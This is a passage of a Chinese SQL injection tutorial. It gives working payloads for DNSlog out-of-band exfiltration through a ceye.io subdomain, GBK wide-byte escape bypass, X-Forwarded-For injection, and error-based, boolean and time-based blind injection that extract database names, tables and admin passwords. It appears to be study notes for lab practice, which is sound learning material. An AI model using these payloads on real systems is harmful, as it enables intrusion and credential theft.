<p><strong>原理</strong>：<code>load_file</code>支持对外的<strong>文件读取</strong>，通过在URL中加入SQL语句，可以<u>借助读取DNS访问记录得到SQL语句的执行结果</u>。</p>
<p>比如构造如下语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if((select load_file(concat(&#x27;////&#x27;,(select version()),&#x27;.yk2kql.ceye.io//abc&#x27;))),0,1)--+</span><br></pre></td></tr></table></figure>

<p><strong>工具</strong>：<a href="http://ceye.io，注册后可以获得个人的DNS地址：">http://ceye.io，注册后可以获得个人的DNS地址：</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/9ded59fe90f60d1cdb4049308f40ac2abe13467b.png@725w_165h_progressive.webp" alt="img"></p>
<p>成功注入之后，可以在ceye.io网站看到所访问的链接，其中包含了version()数据库版本信息5.5.53.1。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728101718259.png" alt="image-20220728101718259"></p>
<p>或者查看数据库名称：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and if((select load_file(concat(&#x27;////&#x27;,(select database()),&#x27;.yk2kql.ceye.io//abc&#x27;))),0,1)--+</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814095417887.png" alt="image-20220814095417887"></p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a></p>
<p>使用DnsLog盲注仅限于windos环境。</p>
<ul>
<li><p><strong>使用工具DnslogSqlinj</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728102540802.png" alt="image-20220728102540802"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728102804316.png" alt="image-20220728102804316"></p>
<p>获取数据库名称：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728103014120.png" alt="image-20220728103014120"></p>
</li>
</ul>
<h3 id="宽字节注入（绕过转义）"><a href="#宽字节注入（绕过转义）" class="headerlink" title="宽字节注入（绕过转义）"></a>宽字节注入（绕过转义）</h3><p>当网站对参数进行了转义时，单引号等会被转义符（反斜杠）转义，导致攻击语句失效。所以在一般情况下，此处是不存在SQL注入漏洞的。</p>
<p>不过有一个特例，就是当数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在单引号前会先加个%df。这样就变成了<code>id=1%df&#39;</code>，经过转义就是<code>id=1%df%5c&#39;</code>。因为反斜杠的编码为%5c，而在GBK编码中，%df%5c是繁体字”連”，所以这时，单引号成功被读入。</p>
<p>所以可以构造攻击语句：<code>id=1%df&#39; and 1=1%23</code>进行注入点的判断。</p>
<h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>XFF是HTTP请求头中的一个头部参数X-Forwarded- for。X- Forwarded- For简称XFF头，它代表客户端真实的IP。</p>
<p>通过修改X-Forwarded-for的值可以伪造客户端IP，将X Forwarded -for设置为127.0.0.1，然后访问该URL，页面返回正常。</p>
<p>如果网站有通过诸如$_SERVER之类的函数获取XFF，并用于SQL语句，那么就可以尝试进行注入。</p>
<p>比如构造攻击语句：<code>X Forwarded -for=127.0.0.1&#39; union select 1,2,3,4#</code></p>
<h2 id="7-SQL注入类型"><a href="#7-SQL注入类型" class="headerlink" title="7. SQL注入类型"></a>7. SQL注入类型</h2><h3 id="按照注入方式"><a href="#按照注入方式" class="headerlink" title="按照注入方式"></a>按照注入方式</h3><h4 id="普通注入和盲注"><a href="#普通注入和盲注" class="headerlink" title="普通注入和盲注"></a>普通注入和盲注</h4><p>普通注入就是注入的<u>页面是直接显示数据库中的字段内容的</u>，我们可以通过 SQL 注入一步一步把数据库中我们想要的内容显示在页面中。</p>
<p>盲注则要困难很多，<u>页面不直接显示数据库字段内容</u>，显示的可能只是一个判断结果（是或者否），页面只能告诉你你构造的 SQL 语句对还是错，你要查询的内容存在还是不存在。</p>
<p>其中不回显的原因可能是 SQL 语句的问题导致，因为像insert、delete等查询语句即使执行成功，也不会回显。此外，网站的前端页面显示也会限制。</p>
<ul>
<li><p>select 查询数据</p>
<p>例：<code>select * from news where id=$id</code></p>
<p>应用：查询用户</p>
</li>
<li><p>insert 插入数据</p>
<p>例：<code>insert into users(id,username,password) values(30,&#39;x&#39;,&#39;123&#39;)</code></p>
<p>应用：网站的用户注册</p>
<p>和select操作的数据包相似，但是不能像普通select注入一样操作。</p>
</li>
<li><p>delete 删除数据</p>
<p>例：<code>delete from users where id=30</code></p>
<p>应用：后台管理里面删除用户等操作、删除留言等</p>
</li>
<li><p>update 更新数据</p>
<p>例：<code>update users set password=&#39;123&#39; where id=11 and username=&#39;admin3&#39;</code></p>
<p>应用：会员或后台中心数据同步或缓存等操作、登录后修改个人信息，如密码等</p>
</li>
<li><p>order by 排序数据</p>
<p>一般结合表名或列名进行数据排序操作</p>
<p>例：select * from news order by $id</p>
<p>例：select id,name,price from news order by $order</p>
</li>
</ul>
<h4 id="基于报错的SQL盲注（优先）"><a href="#基于报错的SQL盲注（优先）" class="headerlink" title="基于报错的SQL盲注（优先）"></a>基于报错的SQL盲注（优先）</h4><p>12种报错注入+万能语句：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
<p>floor、extractvalue、updatexml报错原理：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/692723">https://developer.aliyun.com/article/692723</a></p>
<ul>
<li><p><strong>floor向下取整数</strong></p>
<p>0x7e为<code>~</code></p>
<p>rand() 产生[0,1)的随机小数；</p>
<p>group by 按照指定字段对查询结果进行分组，常结合count()、sum()、avg()、max()、min()等使用。</p>
<p>利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果：在 <strong>rand()和group by同时使用</strong> 的时候，可能会产生超出预期的结果，因为会<u>多次对同一列进行查询</u>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//select</span><br><span class="line">// 爆数据库版本</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 通过修改limit后面数字一个一个爆表</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有表</span><br><span class="line">1&#x27; and (select count(*) from information_schema.tables where table_schema=database() group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有字段名</span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">// 爆出所有字段名</span><br><span class="line">1&#x27; and (select count(*) from information_schema.columns group by concat(0x7e,(select group_concat(username,password) from users),0x7e,floor(rand(0)*2)))#</span><br><span class="line"></span><br><span class="line">//爆出该账户的密码。</span><br><span class="line">1&#x27; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#x27;admin1&#x27;),0x7e,floor(rand(0)*2)))a)# </span><br><span class="line"></span><br><span class="line">//insert</span><br><span class="line">username=x&#x27; or (select 1 from (select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span><br><span class="line"></span><br><span class="line">//update</span><br><span class="line">add=hubeNicky&#x27; or (select 1 from (select count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)</span><br><span class="line">// 由于是在数据包中编辑，所以用+代替空格，避免歧义</span><br></pre></td></tr></table></figure>

<p>报错结果如下，显示出了数据库名称：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195036461.png" alt="image-20220727195036461"></p>
</li>
<li><p><code>extractvalue(xml_frag, xpath_expr)</code></p>
<p>xml_frag为XML标记片段，xpath_expr表示从XML字符串中匹配元素。如果xpath_expr格式语法书写错误的话，就会报错，输出xpath_expr。利用这个特性可以构造注入点。</p>
<p>利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</p>
<p>![1551928141656](<a target="_blank" rel="noopener" href="https://blogs-pic.oss-cn-beijing.aliyuncs.com/images/2019-03-07">https://blogs-pic.oss-cn-beijing.aliyuncs.com/images/2019-03-07</a> 报错注入：extractvalue、updatexml&#x2F;1551928141656.png?x-oss-process&#x3D;style&#x2F;shuiyin)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// insert</span><br><span class="line">username=x&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;</span><br><span class="line"></span><br><span class="line">// update</span><br><span class="line">add=hubeNicky&#x27; or extractvalue(1,concat(0x7e,database())) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">?id=56+or+extractvalue(1,concat(0x7e,database()))</span><br></pre></td></tr></table></figure>

<p>其中的concat()函数是将其参数连成一个字符串，因此不会符合xpath_expr的格式，从而出现格式错误，爆出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727193832420.png" alt="image-20220727193832420"></p>
</li>
<li><p><code>UpdateXML(xml_document, xpath_expr, new_xml)</code></p>
<p>xml_document：String格式，为XML文档对象的名称</p>
<p>xpath_expr：Xpath格式的字符串</p>
<p>new_xml：String格式，替换查找到的符合条件的数据</p>
<p>作用：改变文档中符合条件的节点的值，即改变XML_document中符合XPATH_string的值</p>
<p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为新的XML片段 new_xml，然后返回更改的XML。xml_document替换的部分 与xpath_expr用户提供的XPath表达式匹配。</p>
<p>如果未xpath_expr找到表达式匹配，或者找到多个匹配项，则该函数返回原始xml_document的XML片段。所有三个参数都应该是字符串。</p>
<p>和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1551929714141.png" alt="1551929714141"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// insert</span><br><span class="line">username=x&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><br><span class="line"></span><br><span class="line">// update</span><br><span class="line">add=hubeNicky&#x27; or  updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><br><span class="line"></span><br><span class="line">// delete</span><br><span class="line">?id=56+or+updatexml+(1,concat(0x7e,database()),0)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195708498.png" alt="image-20220727195708498"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727195718450.png" alt="image-20220727195718450"></p>
</li>
</ul>
<h4 id="基于布尔的SQL盲注（其次）"><a href="#基于布尔的SQL盲注（其次）" class="headerlink" title="基于布尔的SQL盲注（其次）"></a>基于布尔的SQL盲注（其次）</h4><p>逻辑判断，regexp正则表达式，like，ascii，left，ord返回字符串第一个字符的ascii码，mid取字符串子串。</p>
<p>布尔型盲注是指注入页面中没有直接显示数据内容，但会显示输出的结果对还是错，查询的数据有还是没有。</p>
<ul>
<li><p><strong>猜解数据库长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or length(database()) &gt; 8 --+    # 符合条件返回正确，反之返回错误</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>猜解数据库名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid(database(),1,1)=&#x27;z&#x27; --+</span><br><span class="line">&#x27;or ORD(mid(database(),1,1)) &gt; 100 --+ :  # 因为需要验证的字符太多，所以可以转化为ascii码验证</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>猜解表的总数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2  --+   # 判断表的总数</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>猜解各个表名的长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+</span><br><span class="line">&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1) = 5 --+ （第二个表）</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>猜解第一个表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1) = &#x27;a&#x27;  --+</span><br><span class="line">或者</span><br><span class="line">&#x27;rr ord(mid(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1)) &gt;100  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>猜解表的字段的总数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 0,1) = 10 --+</span><br><span class="line">&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 1,1) = 10 --+ （第二个字段）</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>猜解第一个字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;表名&#x27; limit 0,1),1,1) = &#x27;i&#x27; --+</span><br><span class="line">或者</span><br><span class="line">&#x27;or ORD(mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;表名&#x27; limit 0,1),1,1)) &gt; 100 --+</span><br><span class="line">或者直接猜解</span><br><span class="line">&#x27; or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;表名&#x27; limit 1,1) = &#x27;username&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>猜解内容长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假如已经知道字段名为  id   username password</span><br><span class="line">&#x27;or (select Length(concat(username,&quot;---&quot;,password)) from admin limit 0,1) = 16  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>猜解内容</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1) = &#x27;a&#x27; --+</span><br><span class="line">或者</span><br><span class="line">&#x27;or ORD(mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1)) &gt; 100 --+    ASCII码猜解</span><br><span class="line">或者直接猜解</span><br><span class="line">&#x27;or (Select concat(username,&quot;-----&quot;,password) from admin limit 0,1 ) = &#x27;admin-----123456&#x27;   --+</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="基于时间的SQL盲注（最后考虑）"><a href="#基于时间的SQL盲注（最后考虑）" class="headerlink" title="基于时间的SQL盲注（最后考虑）"></a>基于时间的SQL盲注（最后考虑）</h4><p>对于某些 SQL 注入页面，可能页面中任何信息都不返回，甚至连记录是否存在都不告诉你，这时布尔型盲注也就无效了。但是基于 <code>sleep()</code> 、<code>benchmark()</code>函数可以实现延时查询，我们可以构造一个判断语法，如果返回结果为真，则延时 5 秒再进行查询操作。那么我们就可以通过观察提交 SQL 注入语句后，页面响应是否有延时卡顿，来判断我们构造的 SQL 语句是否成立。</p>
<p>延时判断，if、sleep。</p>
<ul>
<li><p>if(expr1, expr2,expr3)</p>
<p>如果expr1是TRUE，则IF0的返回值为expr2;否则返回值则为expr3。if()的返回值为数字值或字符串值。具体情况视其所在语境而定。</p>
<p>若数据库名为a，则回显123，否则回显456：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727200138619.png" alt="image-20220727200138619"></p>
</li>
<li><p>if + sleep</p>
<p>若数据库名为a，则延时1s，否则不延时。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727200249771.png" alt="image-20220727200249771"></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 猜解数据库名长度，猜中了延时5s</span><br><span class="line">id=1 and sleep(if(length(database())=8,5,0))--+</span><br><span class="line"></span><br><span class="line">// 逐个猜解数据库名，猜中了延时5s</span><br><span class="line">id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+</span><br><span class="line"></span><br><span class="line">// 逐个猜解表名，猜中了延时5s</span><br><span class="line">id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">like &#x27;ro%&#x27;						# 判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^xiaodi[a-z]&#x27;			# 匹配xiaodi及xiaodi...等if(条件,5,0)</span><br><span class="line">ord()                           # 转换成ascii码</span><br><span class="line">mid (a, b, c)					# 从位置b开始，截取a字符串的c个字符</span><br><span class="line">substr(a, b, c)					# 与mid函数一样，从b位置开始，截取字符串a的c长度</span><br><span class="line">left (database(),1), database() # left(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())=8		    # 判断数据库database()名的长度</span><br><span class="line">ord=ascii ascii(x)=97 			# 判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure>

<p><strong>盲注的加速方法</strong>：</p>
<p>减少查询次数，提高查找的正确率。</p>
<ul>
<li><p><strong>二分法</strong>爆破字符；</p>
</li>
<li><p><strong>位运算法</strong></p>
<p>每次查询确定一位，这样一个字符只需要8次就可以确定了，利用位运算符&amp;实现取某一位的值。</p>
</li>
</ul>
<h3 id="按照注入的数据类型"><a href="#按照注入的数据类型" class="headerlink" title="按照注入的数据类型"></a>按照注入的数据类型</h3><h4 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h4><p>现有的查询语句 Where 筛选条件匹配的字段是数值类型。构造注入语句时不需要单引号和#来闭合语法。</p>
<h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>现有的查询语句 Where 筛选条件匹配的字段是字符型。一般字符型注入需要构造单引号&#x2F;双引号用于闭合语法，还需要加入注释符使原本的引号以及后面的语句无效。</p>
<p><strong>除单引号外，SQL语句也有其他的一些干扰符号：’ “ % ) }等，具体需看写法。</strong></p>
<p>比如<code>select * from user where name like &#39;%xiaodi%&#39;;</code>用于搜索name字段中含有<code>xiaodi</code>的记录。或者<code>select * from user where name=(&#39;xiaodi&#39;);</code>增加了括号。</p>
<p>这时注入的话就要考虑%来闭合语法。实际中应该用什么符号来闭合语法需要自己尝试。</p>
<p>&#x3D;&#x3D;<strong>如何判断字符型、数字型</strong>&#x3D;&#x3D;</p>
<p>比如在文本框中输入 <code>1 and 1=1</code> 和 <code>1 and 1=2</code>，若都能返回数据（都通过），说明可能注入漏洞不是数字型，应该是字符型形式 ；因为对于字符型，使用<code>?id=1 and 1=1</code>相当于执行的是<code>SELECT * FROM users WHERE id=&#39;1 and 1=1&#39; LIMIT 0,1;</code>这样网站对于<code>&#39;1 and 1=1&#39;</code>或者<code>&#39;1 and 1=2&#39;</code>都是取前面的1，都返回数据。</p>
<p>此时在文本框输入 <code>1&#39; and 1=1#</code>，可以返回数据，输入 <code>1&#39; and 1=2#</code>，没有数据返回，说明注入成功，确认漏洞为<code>id=&#39;1&#39; and 1=1#&#39;</code>的字符型SQL注入；（注意：有时用于闭合语法的不一定为单引号，另外在mysql中一般注释后面的字句是采用的–+在有些的字句中采用#注释。需要多测试才能发现）</p>
<p>若在文本框中输入 <code>1 and 1=1</code> 和 <code>1 and 1=2</code>，前者返回数据，后者不返回，直接确定是 <code>id=1 and 1=1</code>的数值型形式。</p>
<h4 id="搜索型"><a href="#搜索型" class="headerlink" title="搜索型"></a>搜索型</h4><p>使用了<code>select * from users where id like &#39;%233&#39;</code>之类的模糊匹配，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">word=a%&#x27; and 1=1#     返回正确</span><br><span class="line">word=a%&#x27; and 1=2#     返回错误</span><br></pre></td></tr></table></figure>

<h3 id="按照提交参数方式"><a href="#按照提交参数方式" class="headerlink" title="按照提交参数方式"></a>按照提交参数方式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$get</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;g&#x27;</span>];    <span class="comment">//get接受参数名g的值赋值给变量get</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$get</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;p&#x27;</span>];  <span class="comment">//post接受参数名p的值赋值给变量post</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$post</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;c&#x27;</span>] ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;r&#x27;</span>] ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP USER AGENT&#x27;</span>];    <span class="comment">// php内置函数，用于获取一些参数信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727103622802.png" alt="image-20220727103622802" style="zoom:67%;">

<h4 id="get数据注入"><a href="#get数据注入" class="headerlink" title="get数据注入"></a>get数据注入</h4><p>get数据的注入在前面已经详细说明。</p>
<h4 id="post数据注入"><a href="#post数据注入" class="headerlink" title="post数据注入"></a>post数据注入</h4><p>（sqlilabs less 11）</p>
<p>网站的URL不会显示具体的参数，而是将参数放在web表单中以post请求的形式提交。</p>
<p>此时需要使用 Burpsuite 等工具来构造 POST 包。BP抓包之后在数据包中进行相同的注入流程。</p>
<p>或者使用hackbar构造post数据也可。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15617979867982.jpg" alt="img" style="zoom:33%;">

